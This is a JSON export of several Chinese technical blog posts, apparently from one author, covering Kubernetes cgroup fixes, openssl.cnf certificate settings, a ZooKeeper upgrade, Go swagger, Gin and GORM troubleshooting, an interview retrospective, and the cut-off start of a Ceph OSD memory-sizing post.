[{"content":"今日在部署旧版本 k8s 集群 (1.16.10) 时出现错误，主要是在新版本操作系统上部署老版本 k8s，kubelet会出现如下错误\nW1123 22:31:47.383423 3686 server.go:605] failed to get the kubelet's cgroup: mountpoint for cpu not found. Kubelet system container metrics may be missing. W1123 22:31:47.383572 3686 server.go:612] failed to get the container runtime's cgroup: failed to get container name for docker process: mountpoint for cpu not found. Runtime system container metrics may be missing. 错误原因 上面的报错是 Kubelet 无法正确访问 Docker 容器运行时的 cgroup 信息，特别是关于 CPU 使用的 cgroup 信息\n从 Linux 内核 4.5 起，cgroup v2 被引入并逐渐取代了 cgroup v1。如果系统启用了 cgroup v2，而 Docker 或 Kubelet 并没有正确配置，可能会导致 Kubelet 无法访问 cgroup 信息。\n查看系统 cgroup 版本\n$ mount | grep cgroup cgroup2 on /sys/fs/cgroup type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot) 更改Docker和Kubelet的cgroup版本 更改 Docker 的 cgroup 版本\n$ docker info |grep Cgroup Cgroup Driver: systemd Cgroup Version: 2 强制 Docker 使用 cgroup v1\n{ \u0026quot;exec-opts\u0026quot;: [\u0026quot;native.cgroupdriver=cgroupfs\u0026quot;], \u0026quot;log-driver\u0026quot;: \u0026quot;json-file\u0026quot; } 查看结果\nroot@debian-template:~# docker info|grep cgroup Cgroup Driver: cgroupfs 配置 kubelet 使用 cgroup v1\n修改 kubelet 参数\n--cgroup-driver=cgroupfs 让操作系统挂载 cgroup v1 查看系统 cgroup 版本\n$ mount | grep cgroup cgroup2 on /sys/fs/cgroup type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot) 手动挂载\n通常手动挂载是不成功的\nmount: /sys/fs/cgroup: cgroup already mounted or mount point busy. dmesg(1) may have more information after failed mount system call. 需要修改启动参数让操作系统挂载上 cgroup v1\nvi /etc/default/grub 在 GRUB_CMDLINE_LINUX_DEFAULT 行中，添加 cgroup_no_v2=1 和 systemd.unified_cgroup_hierarchy=0 选项，确保系统使用 cgroup v1\nGRUB_CMDLINE_LINUX_DEFAULT=\u0026quot;quiet cgroup_no_v2=1 systemd.unified_cgroup_hierarchy=0\u0026quot; 更新 GRUB 配置\nupdate-grub 重启后查看挂载信息\n$ mount | grep group tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,size=4096k,nr_inodes=1024,mode=755,inode64) cgroup2 on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate) cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd) cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory) cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event) cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma) cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids) cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio) cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer) cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio) cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices) cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct) cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset) cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb) cgroup on /sys/fs/cgroup/misc type cgroup (rw,nosuid,nodev,noexec,relatime,misc) 此时 kubelet 可以正常启动了\n","permalink":"https://www.oomkill.com/2024/11/debian12-install-k8s-1.16/","summary":"","title":"debian12 - 高版本系统安装旧版本k8s异常处理"},{"content":"下面是一个完整 openssl.cnf 配置文件\nBASE_DOMAIN= CLUSTER_NAME= CERT_DIR= APISERVER_CLUSTER_IP= MASTER_NAME= [ ca ] # man ca default_ca = CA_default [ CA_default ] # Directory and file locations. dir = \\${ENV::CERT_DIR} certs = \\$dir crl_dir = \\$dir/crl new_certs_dir = \\$dir database = \\$dir/index.txt serial = \\$dir/serial # certificate revocation lists. crlnumber = \\$dir/crlnumber crl = \\$dir/crl/intermediate-ca.crl crl_extensions = crl_ext default_crl_days = 30 default_md = sha256 name_opt = ca_default cert_opt = ca_default default_days = 375 preserve = no policy = policy_loose [ policy_loose ] # Allow the CA to sign a range of certificates. countryName = optional stateOrProvinceName = optional localityName = optional organizationName = optional organizationalUnitName = optional commonName = supplied emailAddress = optional [ req ] # man req default_bits = 4096 distinguished_name = req_distinguished_name string_mask = utf8only default_md = sha256 [ req_distinguished_name ] countryName = Country Name (2 letter code) stateOrProvinceName = State or Province Name localityName = Locality Name 0.organizationName = Organization Name organizationalUnitName = Organizational Unit Name commonName = Common Name # Certificate extensions (man x509v3_config) [ v3_ca ] subjectKeyIdentifier = hash authorityKeyIdentifier = keyid:always,issuer basicConstraints = critical, CA:true, pathlen:0 keyUsage = critical, digitalSignature, cRLSign, keyCertSign [ client_cert ] basicConstraints = CA:FALSE nsCertType = client nsComment = \u0026quot;OpenSSL Generated Client Certificate\u0026quot; subjectKeyIdentifier = hash authorityKeyIdentifier = keyid,issuer keyUsage = critical, nonRepudiation, digitalSignature, keyEncipherment extendedKeyUsage = clientAuth, serverAuth subjectAltName = @etcd_client [ server_cert ] basicConstraints = CA:FALSE nsCertType = server nsComment = \u0026quot;OpenSSL Generated Server Certificate\u0026quot; subjectKeyIdentifier = hash authorityKeyIdentifier = keyid,issuer:always keyUsage = critical, digitalSignature, keyEncipherment extendedKeyUsage = serverAuth, clientAuth [ identity_server_cert ] basicConstraints = CA:FALSE nsCertType = server nsComment = \u0026quot;OpenSSL Generated Server Certificate\u0026quot; subjectKeyIdentifier = hash authorityKeyIdentifier = keyid,issuer:always keyUsage = critical, digitalSignature, keyEncipherment extendedKeyUsage = serverAuth subjectAltName = DNS.1:tectonic-identity-api.tectonic-system.svc.cluster.local [ etcd_server_cert ] basicConstraints = CA:FALSE nsCertType = server nsComment = \u0026quot;OpenSSL Generated Server Certificate\u0026quot; subjectKeyIdentifier = hash authorityKeyIdentifier = keyid,issuer:always keyUsage = critical, digitalSignature, keyEncipherment extendedKeyUsage = serverAuth, clientAuth subjectAltName = @etcd_server_and_peer_dns [ etcd_peer_cert ] basicConstraints = CA:FALSE nsCertType = server nsComment = \u0026quot;OpenSSL Generated Server Certificate\u0026quot; subjectKeyIdentifier = hash authorityKeyIdentifier = keyid,issuer:always keyUsage = critical, digitalSignature, keyEncipherment extendedKeyUsage = serverAuth, clientAuth subjectAltName = @etcd_server_and_peer_dns [ apiserver_cert ] basicConstraints = CA:FALSE nsCertType = server nsComment = \u0026quot;OpenSSL Generated Server Certificate\u0026quot; subjectKeyIdentifier = hash authorityKeyIdentifier = keyid,issuer:always keyUsage = critical, digitalSignature, keyEncipherment extendedKeyUsage = serverAuth, clientAuth subjectAltName = @apiserver_names [ master_component_client_cert ] basicConstraints = CA:FALSE nsCertType = client nsComment = \u0026quot;OpenSSL Generated Client Certificate\u0026quot; subjectKeyIdentifier = hash authorityKeyIdentifier = keyid,issuer keyUsage = critical, nonRepudiation, digitalSignature, keyEncipherment extendedKeyUsage = clientAuth subjectAltName = @master_component_names [etcd_server_and_peer_dns] DNS.1 = \\${ENV::BASE_DOMAIN} DNS.2 = localhost IP.1 = 10.0.0.5 IP.2 = 127.0.0.1 IP.3 = 127.0.0.5 [apiserver_names] DNS.1 = \\${ENV::CLUSTER_NAME}-\\${ENV::BASE_DOMAIN} DNS.2 = \\${ENV::BASE_DOMAIN} DNS.3 = kubernetes DNS.4 = kubernetes.default DNS.5 = kubernetes.default.svc DNS.6 = kubernetes.default.svc.cluster.local IP.1 = \\${ENV::APISERVER_CLUSTER_IP} IP.2 = 10.0.0.5 IP.3 = 10.0.0.4 [ master_component_names ] DNS.1 = \\${ENV::MASTER_NAME}.\\${ENV::BASE_DOMAIN} DNS.2 = \\${ENV::BASE_DOMAIN} IP.1 = 10.0.0.5 IP.2 = 10.0.0.4 # used for etcd_client [ etcd_client ] DNS.1 = localhost IP.1 = 10.0.0.5 IP.2 = 10.0.0.4 IP.3 = 10.0.0.6 IP.4 = 127.0.0.1 环境变量部分，用于定义配置文件内的配置会读取这个环境变量来替换\nBASE_DOMAIN= # 基础域名，通常用于 Kubernetes 集群或 API 服务器的域名配置 CLUSTER_NAME= # 集群名称，通常作为集群的标识符 CERT_DIR= # 证书文件存放的目录 APISERVER_CLUSTER_IP= # API 服务器的集群内部 IP 地址 MASTER_NAME= # Kubernetes 主节点的名称 CA 配置部分 指定默认的 CA 配置部分，即下面的 [CA_default] 部分\n[ ca ] default_ca = CA_default [CA_default] 部分 该部分定义了 CA (证书颁发机构) 的各种配置参数。\n# Directory and file locations. dir = \\${ENV::CERT_DIR} # 证书存放的根目录 certs = \\$dir # 证书文件夹 crl_dir = \\$dir/crl # CRL（证书吊销列表）文件夹 new_certs_dir = \\$dir # 新证书文件夹 database = \\$dir/index.txt # 用于存储证书请求、签发等信息的数据库文件 serial = \\$dir/serial # 用于跟踪签发证书的序列号文件 crlnumber = \\$dir/crlnumber # CRL 证书吊销序列号 crl = \\$dir/crl/intermediate-ca.crl # 吊销列表文件 crl_extensions = crl_ext # CRL 扩展配置 default_crl_days = 30 # 默认 CRL 有效期为 30 天 default_md = sha256 # 默认使用 sha256 哈希算法 name_opt = ca_default # 证书的名称选项 cert_opt = ca_default # 证书的选项 default_days = 375 # 证书默认有效期为 375 天 preserve = no # 是否保留 CA 对已签发证书的审计日志 policy = policy_loose # 使用 'policy_loose' 签发证书 [policy_loose] 部分 该部分定义了证书签发策略，允许一些字段为 optional，即证书可以包含这些字段，但不要求必须存在。\ncountryName = optional # 国家名称可选 stateOrProvinceName = optional # 省/州名称可选 localityName = optional # 地市名称可选 organizationName = optional # 组织名称可选 organizationalUnitName = optional # 组织单位名称可选 commonName = supplied # 公共名称是必须提供的（通常是域名或主机名） emailAddress = optional # 邮件地址可选 [req] 和 [req_distinguished_name] 部分 distinguished执意为，显著的，杰出的。用于生成证书请求（CSR）。配置了默认的密钥长度、签名算法等信息。\n[ req ] default_bits = 4096 # 默认的密钥位数为 4096 位 distinguished_name = req_distinguished_name # 引用 'req_distinguished_name' 部分来定义 DN（区分名称） string_mask = utf8only # 使用 UTF-8 字符编码 default_md = sha256 # 默认使用 sha256 作为散列算法 [ req_distinguished_name ] countryName = Country Name (2 letter code) # 国家（2个字母的国家代码） stateOrProvinceName = State or Province Name # 省/州名称 localityName = Locality Name # 城市/地区名称 0.organizationName = Organization Name # 组织名称 organizationalUnitName = Organizational Unit Name # 组织单位名称 commonName = Common Name # 通用名称（通常是域名或主机名） 证书扩展部分 这些扩展是用于指定证书的用途和其它属性的配置，通常包括证书的使用场景（例如，客户端、服务器认证等）。\n扩展部分的名字，例如[v3_ca] 并不是一个固定的格式，只是一个 OpenSSL 配置文件中的命名部分，通常用于定义颁发 CA（证书颁发机构）证书时所需要的扩展（extensions）。你可以根据需要自定义该部分的内容，但它通常包含一些通用的证书扩展，尤其是 基本约束 (basicConstraints)、密钥用法 (keyUsage) 和 证书签发权限。\n[v3_ca] 部分 该部分用于设置根证书（CA）的扩展，包括证书签发权限、密钥使用等。\nsubjectKeyIdentifier = hash # 用于标识证书的主题密钥标识符 authorityKeyIdentifier = keyid:always,issuer # 用于标识证书的颁发者密钥标识符 # 基本约束，标明该证书为 CA 证书，且路径长度为 0（不能作为其他证书的颁发机构） # CA:true 表示这个为ca basicConstraints = critical, CA:true, pathlen:0 keyUsage = critical, digitalSignature, cRLSign, keyCertSign # 证书使用场景：数字签名、证书吊销列表签名、证书签发 客户端、服务器证书扩展部分 这些部分定义了不同类型证书（如客户端证书、服务器证书）的扩展选项：\n[client_cert] 和 [server_cert] 定义了客户端和服务器证书的基本约束和使用场景。 [identity_server_cert] 和 [etcd_server_cert] 定义了特定的服务器证书，通常用于指定 API 服务、etcd 服务等。 这些扩展中的 subjectAltName 字段用于指定证书的备用名称（例如，DNS 或 IP 地址），这是证书有效性的一个重要部分。\n[ client_cert ] # 不允许作为 CA 证书使用 basicConstraints = CA:FALSE # 客户端证书使用场景 keyUsage = critical, nonRepudiation, digitalSignature, keyEncipherment # 扩展用途：客户端身份验证、服务器身份验证 extendedKeyUsage = clientAuth, serverAuth # 使用 'etcd_client' 部分中定义内容用作的 SAN 配置 subjectAltName = @etcd_client [ server_cert ] # 不允许作为 CA 证书使用 basicConstraints = CA:FALSE # 服务器证书使用场景 keyUsage = critical, digitalSignature, keyEncipherment # 扩展用途：服务器身份验证、客户端身份验证 extendedKeyUsage = serverAuth, clientAuth # 使用 'etcd_server_and_peer_dns' 配置 subjectAltName = @etcd_server_and_peer_dns keyUsage：通常包括 digitalSignature 和 keyEncipherment，表明证书可以用于签名和加密。 extendedKeyUsage：指定该证书可用于 serverAuth（服务器认证）和 clientAuth（客户端认证）。 subjectAltName：通常会列出服务器的 DNS 名称或 IP 地址，用于验证服务器身份。 当 extendedKeyUsage = serverAuth, clientAuth 同时设定时，表示该证书可以同时用于服务器身份验证和客户端身份验证。这意味着该证书可以被用于 服务器端 来验证客户端的请求，也可以被用作 客户端 来向服务器进行身份验证。例如 Mutual TLS，mTLS。\n单独配置：extendedKeyUsage = serverAuth 或 extendedKeyUsage = clientAuth 时：\nextendedKeyUsage = serverAuth：表示证书的用途是 服务器身份验证，即浏览器可以用它来验证服务器的真实性，确保用户正在访问的是正确的、合法的服务器。此配置通常用于大多数网站的 SSL/TLS 服务器证书。 extendedKeyUsage = clientAuth：表示证书仅用于客户端身份验证，例如用于 SSL/TLS 客户端证书。 Subject Alternative Name (SAN) 部分 SAN 是证书中的一个字段，允许将多个 DNS 名称、IP 地址或 URI 作为证书的有效域名或 IP 地址。它可以包含多个 DNS 名称和 IP 地址。\n[ etcd_server_and_peer_dns ] DNS.1 = \\${ENV::BASE_DOMAIN} # 基础域名 DNS.2 = localhost # 本地主机名 IP.1 = 10.0.0.5 # IP 地址 IP.2 = 127.0.0.1 # 本地回环地址 IP.3 = 127.0.0.5 # 另一个本地回环地址 [ apiserver_names ] # 使用集群名称和基础域名组成的 DNS 名称 # 使用上面的变量 DNS.1 = \\${ENV::CLUSTER_NAME}-\\${ENV::BASE_DOMAIN} # 基础域名 DNS.2 = \\${ENV::BASE_DOMAIN} # API 服务器的 IP 地址 IP.1 = \\${ENV::APISERVER_CLUSTER_IP} # 备用 IP 地址 IP.2 = 10.0.0.5 ","permalink":"https://www.oomkill.com/2024/11/openssl-cnf/","summary":"","title":"openssl.cnf详解"},{"content":"最近，我不得不将 Zookeeper 3.4.18 集群升级到 3.6+。要求是：无感升级，不丢失数据，并且尽量不向任何用户发出通知。在调研zookeeper 版本后，发现 3.6+ 支持了 metrics 模块，比较符合需求，所以需要从 3.4.18 升级至 3.6.4\n3.5 + 支持动态配置 3.6.0+ 支持内置 metrics 模块 现有集群配置 集群IP 当前目录 新版本目录 192.240.16.18 /usr/local/zookeeper-3.4.14/ /usr/local/apache-zookeeper-3.6.4-bin/ 192.240.16.21 /usr/local/zookeeper-3.4.14/ /usr/local/apache-zookeeper-3.6.4-bin/ 192.240.16.28 /usr/local/zookeeper-3.4.14/ /usr/local/apache-zookeeper-3.6.4-bin/ 192.240.16.147 /usr/local/zookeeper-3.4.14/ /usr/local/apache-zookeeper-3.6.4-bin/ 192.240.16.202 /usr/local/zookeeper-3.4.14/ /usr/local/apache-zookeeper-3.6.4-bin/ 下载安装包 在官方 archive 找到对应安装包\n从 zk 3.5 起安装包分为带 “bin” 和不带 “bin” 的\n带 “bin” 的包含所需jar包 不带 “bin” 的需要自行编译 wget https://archive.apache.org/dist/zookeeper/zookeeper-3.6.4/ 解压\ntar Czxf /usr/local/ apache-zookeeper-3.6.4-bin.tar.gz \u0026amp;\u0026amp; cd /usr/local 升级版本 注意以下步骤需要对每个 zk 服务器都执行一边\n检查状态 检查每个 zk 实例的角色，注意，Leader 要留着最后升级\n$ echo status | nc localhost 2181 Zookeeper version: 3.4.14-4c25d480e66aadd371de8bd2fd8da255ac140bcf, built on 03/06/2019 16:18 GMT Clients: /10.222.16.147:58936[1](queued=0,recved=24290,sent=24434) /10.222.16.18:56736[1](queued=0,recved=24213,sent=24363) /127.0.0.1:60822[0](queued=0,recved=1,sent=0) Latency min/avg/max: 0/0/77 Received: 48505 Sent: 48798 Connections: 3 Outstanding: 0 Zxid: 0x5c000027ee Mode: leader Node count: 440526 Proposal sizes last/min/max: 139/32/1039 准备配置文件 产生默认配置文件\ncp apache-zookeeper-3.6.4-bin/conf/zoo_sample.cfg apache-zookeeper-3.6.4-bin/conf/zoo.cfg 启用 prometheus metrics 相关配置\nsed -i \u0026quot;s@#metricsProvider.className=org.apache.zookeeper.metrics.prometheus.PrometheusMetricsProvider@metricsProvider.className=org.apache.zookeeper.metrics.prometheus.PrometheusMetricsProvider@g\u0026quot; apache-zookeeper-3.6.4-bin/conf/zoo.cfg sed -i \u0026quot;s@#metricsProvider.httpPort=7000@metricsProvider.httpPort=7000@g\u0026quot; apache-zookeeper-3.6.4-bin/conf/zoo.cfg sed -i \u0026quot;s@#metricsProvider.exportJvmInfo=true@metricsProvider.exportJvmInfo=true@g\u0026quot; apache-zookeeper-3.6.4-bin/conf/zoo.cfg 检查配置\ntail -5 apache-zookeeper-3.6.4-bin/conf/zoo.cfg 增加旧的配置\n# 增加旧的配置 cat \u0026lt;\u0026lt;EOF \u0026gt;\u0026gt; apache-zookeeper-3.6.4-bin/conf/zoo.cfg dataDir=/usr/local/zookeeper/data dataLogDir=/usr/local/zookeeper/logs # the port at which the clients will connect clientPort=2181 server.1=10.240.16.18:2888:3888 server.2=10.240.16.21:2888:3888 server.3=10.240.16.28:2888:3888 server.4=10.240.16.147:2888:3888 server.5=10.240.16.202:2888:3888 autopurge.snapRetainCount=3 autopurge.purgeInterval=24 EOF 检查配置\ntail -13 apache-zookeeper-3.6.4-bin/conf/zoo.cfg 直接转移数据文件\nln -svnf /usr/local/zookeeper-3.4.14/data /usr/local/apache-zookeeper-3.6.4-bin/data ln -svnf /usr/local/zookeeper-3.4.14/logs /usr/local/apache-zookeeper-3.6.4-bin/logs ls -l /usr/local/apache-zookeeper-3.6.4-bin/ 修改新版启动脚本\n此步骤是为了可以使用 stat 命令\nsed -i '77a\\ZOOMAIN=\u0026quot;-Dzookeeper.4lw.commands.whitelist=* ${ZOOMAIN}\u0026quot;' apache-zookeeper-3.6.4-bin/bin/zkServer.sh tail -n +70 apache-zookeeper-3.6.4-bin/bin/zkServer.sh | head -n 9 停止旧版本\nzookeeper/bin/zkServer.sh stop 连接到新版本\nln -svnf apache-zookeeper-3.6.4-bin zookeeper 启动服务\nzookeeper/bin/zkServer.sh start 验证服务\necho status | nc localhost 2181 检查内容\nzookeeper/bin/zkCli.sh ls /clickhouse/tables/01-01 恢复旧版本 ln -svnf zookeeper-3.4.14 zookeeper Reference [1] zookeeper启动报错：Error: Could not find or load main class org.apache.zookeeper.server.quorum.QuorumPeerMain [2] zookeeper 异常 ：stat is not executed because it is not in the whitelist. Connection closed b\n[3] ZooKeeper Monitor Guide\n[4] KIP-902: Upgrade Zookeeper to 3.8.2\n","permalink":"https://www.oomkill.com/2024/11/zk-upgrade-3.4-to-3.6/","summary":"","title":"zookeeper版本升级 - from 3.4 to 3.8"},{"content":"总结：无意义面试，浪费时间\n遇到的都是\nXXX会不会写， XXX会不会用 例如，nginx会不会配置，dockerfile 会不会写\n比较有效的算，“删除 Pod 处于 termanating，怎么办”。\n答：termanating 有多种，不能够优雅处理这个删除，例如Node节点不能通讯，Pod挂在无法卸载，\u0026ndash;force就可以，废物面试官说你多看一下。\nfinalizers：\nfinalizers in the metadata.finalizers field. When you attempt to delete the resource, the API server handling the delete request notices the values in the finalizers field and does the following:\nModifies the object to add a metadata.deletionTimestamp field with the time you started the deletion. Prevents the object from being removed until all items are removed from its metadata.finalizers field Returns a 202 status code (HTTP \u0026ldquo;Accepted\u0026rdquo;) 结果总结：\n在自我介绍阶段要引导废物面试官的思维，否则他会根据他的认知来影响你，所以自我介绍是非常重要的 面试者和面试官差异向大时，会造成认知度不一致，这种情况下，90%的面试是无效的。 遇到问你会不会xxx，会不会用xxx的直接打断他就可以了，不要在这浪费时间 如果不想去，直接说很高价钱就可以了 ","permalink":"https://www.oomkill.com/2024/10/interview-retrospective-2304/","summary":"","title":"interview retrospective 2411"},{"content":"问题：当使用的结构体为嵌套格式，会提示 recursion detected 或 cannot find type definition\ntype Instance struct { metav1.TypeMeta Instances []InstanceItem `json:\u0026quot;instances\u0026quot; yaml:\u0026quot;instances\u0026quot; form:\u0026quot;instances\u0026quot; binding:\u0026quot;required\u0026quot;` ServiceSelector map[string]string `json:\u0026quot;serivce_selector\u0026quot; yaml:\u0026quot;serivce_selector\u0026quot; form:\u0026quot;serivce_selector\u0026quot;` } type InstanceItem struct { Name string `json:\u0026quot;name\u0026quot; yaml:\u0026quot;name\u0026quot; form:\u0026quot;name\u0026quot; binding:\u0026quot;required\u0026quot;` PromEndpoint string `json:\u0026quot;prom_endpoint\u0026quot; yaml:\u0026quot;prom_endpoint\u0026quot; form:\u0026quot;prom_endpoint\u0026quot; binding:\u0026quot;required\u0026quot;` Labels map[string]string `json:\u0026quot;labels\u0026quot; yaml:\u0026quot;labels\u0026quot; form:\u0026quot;labels\u0026quot;` } go swagger 注释为\n// deleteInstance godoc // @Summary Remove prometheus instance. // @Description Remove prometheus instance. // @Tags Instances // @Accept json // @Produce json // @Param query body instance.Instance false \u0026quot;body\u0026quot; // @securityDefinitions.apikey BearerAuth // @Success 200 {object} interface{} // @Router /ph/v1/instance [DELETE] 执行命令时报错如下：\n$ swag init -g cmd/ph-server/main.go --output ./docs/ --packageName docs 2024/09/22 19:56:19 Generate swagger docs.... 2024/09/22 19:56:19 Generate general API Info, search dir:./ 2024/09/22 19:56:19 warning: failed to get package name in dir: ./, error: execute go list command, exit status 1, stdout:, stderr:no Go files in /mnt/d/src/go/work/prometheus-hub 2024/09/22 19:56:19 Generating instance.Instance 2024/09/22 19:56:19 Error parsing type definition 'instance.Instance': : cannot find type definition: metav1.TypeMeta 2024/09/22 19:56:19 Skipping 'instance.Instance', recursion detected. 2024/09/22 19:56:19 Skipping 'instance.Instance', recursion detected. 2024/09/22 19:56:19 Skipping 'instance.Instance', recursion detected. 2024/09/22 19:56:19 Generating target.TargetItem 解决： --parseDependency $ swag init -g cmd/ph-server/main.go --output ./docs/ \\ --packageName docs \\ --parseDependency --parseInternal 2024/09/22 20:20:40 Generate swagger docs.... 2024/09/22 20:20:40 Generate general API Info, search dir:./ 2024/09/22 20:20:40 warning: failed to get package name in dir: ./, error: execute go list command, exit status 1, stdout:, stderr:no Go files in /mnt/d/src/go/work/prometheus-hub 2024/09/22 20:20:41 warning: failed to evaluate const mProfCycleWrap at /usr/local/go/src/runtime/mprof.go:165:7, reflect: call of reflect.Value.Len on zero Value 2024/09/22 20:20:41 Generating github_com_cylonchau_prometheus-hub_pkg_apis_instance.Instance 2024/09/22 20:20:41 Generating github_com_cylonchau_prometheus-hub_pkg_apis_meta_v1.TypeMeta 2024/09/22 20:20:41 Generating github_com_cylonchau_prometheus-hub_pkg_apis_instance.InstanceItem Reference How to use a type definition in another file with swaggo?\n","permalink":"https://www.oomkill.com/2024/09/goswagger-skipping-recursion-detected/","summary":"","title":"Goswagger - Skipping '', recursion detected"},{"content":"遇到问题：gin 使用 Bind 时无法填充，改成下面代码可以获取到\ntype User struct { Name string `form:\u0026quot;name,default=user1\u0026quot; json:\u0026quot;name,default=user2\u0026quot;` Age int `form:\u0026quot;age,default=10\u0026quot; json:\u0026quot;age,default=20\u0026quot;` } r := gin.Default() // way1 curl 127.0.0.1:8900/bind?name=aa // way2 curl -X POST 127.0.0.1:8900/bind -d \u0026quot;name=aa\u0026amp;age=30\u0026quot; // way3 curl -X POST 127.0.0.1:8900/bind -H \u0026quot;Content-Type: application/json\u0026quot; -d \u0026quot;{\\\u0026quot;name\\\u0026quot;: \\\u0026quot;aa\\\u0026quot;}\u0026quot; r.Any(\u0026quot;/bind\u0026quot;, func(c *gin.Context) { var user User //user = User{Name: \u0026quot;bb\u0026quot;, Age: 11} //way4:A variable of type User can be generated with the default value before bind if c.ContentType() == binding.MIMEJSON { //way5:A variable of type User can be generated with the default value before bind. _ = binding.MapFormWithTag(\u0026amp;user, nil, \u0026quot;json\u0026quot;) } _ = c.Bind(\u0026amp;user) //Note that because bind is used here to request json, you specify the Content-Type header c.String(200, \u0026quot;Hello %v age %v\u0026quot;, user.Name, user.Age) }) // The above 4 way. // way1/2 structTag is work.because gin at queryBinding/formBinding execute mapFormByTag logic, will check formTag // way3 structTag not work. gin at jsonBinding non-execution mapFormByTag logic // way4/way5 no matter query/form/json All valid // way5 is work. Because the mapFormByTag logic is triggered in addition r.Run(\u0026quot;:8900\u0026quot;) Reference Bind should support default values\n","permalink":"https://www.oomkill.com/2024/09/gin-param-default-value/","summary":"","title":"Gin - 参数默认值问题"},{"content":"遇到问题：BeforeDelete 在删除时获取 SQL 不正确\nBeforeDelete 代码如下\nfunc (t *Target) BeforeDelete(tx *gorm.DB) (err error) { // 找到与此 Target 相关的所有 Labels var labels []Label if err := tx.Model(t).Association(\u0026quot;Labels\u0026quot;).Find(\u0026amp;labels); err != nil { klog.V(4).Infof(\u0026quot;Error fetching labels: %v\u0026quot;, err) return err } for _, label := range labels { if err := tx.Delete(\u0026amp;label).Error; err != nil { klog.V(4).Infof(\u0026quot;Error deleting label:\u0026quot;, err) return err } } // 注意：由于设置了 OnDelete:SET NULL，因此在删除 Labels 后，会清理 target_labels 表中的关联 return nil } 删除写法\nfunc DeleteTargets(target *target.TargetItem) (enconterError error) { // 创建 Target existingTarget := \u0026amp;Target{} if enconterError = DB.Model(\u0026amp;Target{}).Where(\u0026quot;address = ? AND metric_path = ? AND scrape_time = ? AND scrape_timeout = ?\u0026quot;, target.Address, target.MetricPath, target.ScrapeTime, target.ScrapeTimeout).Delete(existingTarget).Error; enconterError != nil { return enconterError // 如果找不到记录，则返回错误 } return enconterError } 删除时遇到的问题：SQL 生成不正确 target_id IN (NULL)\nBeforeDelete hook triggered 2024/09/22 00:33:36 /mnt/d/src/go/work/prometheus-hub/pkg/model/target.go:37 [0.184ms] [rows:0] SELECT `labels`.`id`,`labels`.`key`,`labels`.`value` FROM `labels` JOIN `target_labels` ON `target_labels`.`label_id` = `labels`.`id` AND `target_labels`.`target_id` IN (NULL) 问题原因，在删除这条记录时，默认 (t *Target) 必须 id 存在，如果不存在就是 NULL，所以先用 find 查询保证这个操作的 t 中存在主键才可以。\nfunc DeleteTargets(target *target.TargetItem) (enconterError error) { // 创建 Target existingTarget := \u0026amp;Target{} if enconterError = DB.Model(\u0026amp;Target{}).Where(\u0026quot;address = ? AND metric_path = ? AND scrape_time = ? AND scrape_timeout = ?\u0026quot;, target.Address, target.MetricPath, target.ScrapeTime, target.ScrapeTimeout).Find(existingTarget).Delete(existingTarget).Error; enconterError != nil { return enconterError // 如果找不到记录，则返回错误 } return enconterError } 修改后的输出 SQL\n2024/09/22 00:41:21 /mnt/d/src/go/work/prometheus-hub/pkg/model/target.go:33 [0.126ms] [rows:3] SELECT `labels`.`id`,`labels`.`key`,`labels`.`value` FROM `labels` JOIN `target_labels` ON `target_labels`.`label_id` = `labels`.`id` AND `target_labels`.`target_id` = 17 2024/09/22 00:41:21 /mnt/d/src/go/work/prometheus-hub/pkg/model/target.go:39 [5.229ms] [rows:1] DELETE FROM `labels` WHERE `labels`.`id` = 7 2024/09/22 00:41:21 /mnt/d/src/go/work/prometheus-hub/pkg/model/target.go:39 [0.078ms] [rows:1] DELETE FROM `labels` WHERE `labels`.`id` = 8 2024/09/22 00:41:21 /mnt/d/src/go/work/prometheus-hub/pkg/model/target.go:39 [0.062ms] [rows:1] DELETE FROM `labels` WHERE `labels`.`id` = 9 2024/09/22 00:41:21 /mnt/d/src/go/work/prometheus-hub/pkg/model/target.go:70 [15.661ms] [rows:1] DELETE FROM `targets` WHERE (address = \u0026quot;10.0.0.14:9090\u0026quot; AND metric_path = \u0026quot;/metrics\u0026quot; AND scrape_time = 30 AND scrape_timeout = 10) AND `targets`.`id` = 17 ","permalink":"https://www.oomkill.com/2024/09/gorm-before-delete/","summary":"","title":"Gorm - BeforeDelete无法获取正确条目"},{"content":"本文记录了在使用 ceph 集群时遭遇到的内存问题，以及引用和参考一些资料用于对在 ceph 集群使用时的内存预估。\nOSD的内存需求 如何评估 Ceph OSD 所需的硬件也是对于集群选型，集群优化的一个必要条件，这里主要找到两个可靠的参考资料用于评估 OSD 内存配置大小\nIBM Storage Ceph IBM Storage Ceph 提供了一个运行 Ceph 用于预估系统配置的一个最小推荐列表 [1]，个人感觉可以参考这些信息用于自己集群的优化。主要用于容器化的 Ceph 集群\nProcess Criteria Minimum Recommended ceph-osd-container Processor 1x AMD64 or Intel 64 CPU CORE per OSD container RAM Minimum of 5 GB of RAM per OSD container OS Disk 1x OS disk per host OSD Storage 1x storage drive per OSD container. Cannot be shared with OS Disk. block.db Optional, but IBM recommended, 1x SSD or NVMe or Optane partition or lvm per daemon. Sizing is 4% of block.data for BlueStore for object, file, and mixed workloads and 1% of block.data for the BlueStore for Block Device, Openstack cinder, and Openstack cinder workloads. block.wal Optionally, 1x SSD or NVMe or Optane partition or logical volume per 